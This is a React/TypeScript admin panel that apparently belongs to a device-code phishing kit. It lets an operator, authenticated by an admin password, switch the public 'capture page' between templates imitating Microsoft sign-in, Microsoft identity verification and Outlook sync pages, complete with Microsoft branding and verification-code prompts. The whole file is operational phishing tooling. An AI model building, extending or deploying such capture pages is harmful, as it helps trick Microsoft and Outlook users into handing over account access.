import React, { useState, useEffect } from 'react';
import type { CaptureTemplate } from '../types';

interface TemplatesPanelProps {
  storedPassword: string;
}

interface TemplateInfo {
  id: CaptureTemplate;
  name: string;
  description: string;
  preview: string;
}

const TEMPLATES: TemplateInfo[] = [
  {
    id: 'default',
    name: 'Default — Device Code',
    description: 'The original Outlook Electron capture page. Clean sign-in flow with device verification code, step-by-step instructions, and countdown timer.',
    preview: 'default',
  },
  {
    id: 'microsoft-verify',
    name: 'Microsoft Verify',
    description: 'Looks like a Microsoft account identity verification page. Minimal and professional design matching the Microsoft sign-in experience.',
    preview: 'microsoft-verify',
  },
  {
    id: 'outlook-sync',
    name: 'Outlook Sync',
    description: 'Appears as an Outlook mailbox sync setup page. Split-panel design with features list, account type selector, and sync progress bar.',
    preview: 'outlook-sync',
  },
];

export function TemplatesPanel({ storedPassword }: TemplatesPanelProps): React.ReactElement {
  const [activeTemplate, setActiveTemplate] = useState<CaptureTemplate>('default');
  const [saving, setSaving] = useState(false);
  const [saveMsg, setSaveMsg] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadTemplate();
  }, []);

  async function loadTemplate(): Promise<void> {
    setLoading(true);
    try {
      const res = await fetch('/api/templates', {
        headers: { 'X-Admin-Password': storedPassword },
      });
      if (res.ok) {
        const data = await res.json() as { template: CaptureTemplate };
        setActiveTemplate(data.template || 'default');
      }
    } catch { /* default */ }
    setLoading(false);
  }

  async function handleSelect(templateId: CaptureTemplate): Promise<void> {
    setSaving(true);
    setSaveMsg('');
    try {
      const res = await fetch('/api/templates', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Admin-Password': storedPassword,
        },
        body: JSON.stringify({ template: templateId }),
      });
      const data = await res.json() as { success: boolean };
      if (data.success) {
        setActiveTemplate(templateId);
        setSaveMsg(`Template "${TEMPLATES.find(t => t.id === templateId)?.name}" is now active on the capture page.`);
      }
    } catch {
      setSaveMsg('Failed to update template.');
    }
    setSaving(false);
  }

  if (loading) {
    return (
      <div className="dash-loading">
        <div className="dash-spinner" />
        <span>Loading templates...</span>
      </div>
    );
  }

  return (
    <div className="templates-panel">
      <p className="templates-desc">
        Choose which design the public capture page displays. The active template determines what visitors see when they visit the root URL.
      </p>

      {saveMsg && <div className="templates-save-msg">{saveMsg}</div>}

      <div className="templates-grid">
        {TEMPLATES.map(tpl => (
          <div
            key={tpl.id}
            className={'template-card' + (activeTemplate === tpl.id ? ' active' : '')}
          >
            <div className={'template-preview template-preview-' + tpl.preview}>
              {tpl.id === 'default' && (
                <div className="template-preview-content default-preview">
                  <div className="tp-brand">
                    <div className="tp-icon-blue" />
                    <span>Outlook Electron</span>
                  </div>
                  <div className="tp-card">
                    <div className="tp-title">Sign in to your account</div>
                    <div className="tp-btn-blue">Generate Verification Code</div>
                  </div>
                </div>
              )}
              {tpl.id === 'microsoft-verify' && (
                <div className="template-preview-content verify-preview">
                  <div className="tp-ms-logo">
                    <div className="tp-ms-squares">
                      <span style={{ background: '#f25022' }} />
                      <span style={{ background: '#7fba00' }} />
                      <span style={{ background: '#00a4ef' }} />
                      <span style={{ background: '#ffb900' }} />
                    </div>
                    <span className="tp-ms-text">Microsoft</span>
                  </div>
                  <div className="tp-card">
                    <div className="tp-title">Verify your identity</div>
                    <div className="tp-text-sm">Protect your account</div>
                    <div className="tp-btn-blue">Send verification code</div>
                  </div>
                </div>
              )}
              {tpl.id === 'outlook-sync' && (
                <div className="template-preview-content sync-preview">
                  <div className="tp-split">
                    <div className="tp-split-left">
                      <div className="tp-icon-white" />
                      <span>Outlook</span>
                    </div>
                    <div className="tp-split-right">
                      <div className="tp-title">Connect your account</div>
                      <div className="tp-btn-blue">Start sync</div>
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="template-info">
              <div className="template-header">
                <h3>{tpl.name}</h3>
                {activeTemplate === tpl.id && <span className="template-active-badge">ACTIVE</span>}
              </div>
              <p>{tpl.description}</p>
              <div className="template-actions">
                {activeTemplate === tpl.id ? (
                  <button className="template-btn current" disabled>Current template</button>
                ) : (
                  <button
                    className="template-btn activate"
                    onClick={() => handleSelect(tpl.id)}
                    disabled={saving}
                  >
                    {saving ? 'Activating...' : 'Activate'}
                  </button>
                )}
                <a href={tpl.id === 'default' ? '/' : `/preview/${tpl.id}`} target="_blank" rel="noopener noreferrer" className="template-btn preview-link">
                  Preview
                </a>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
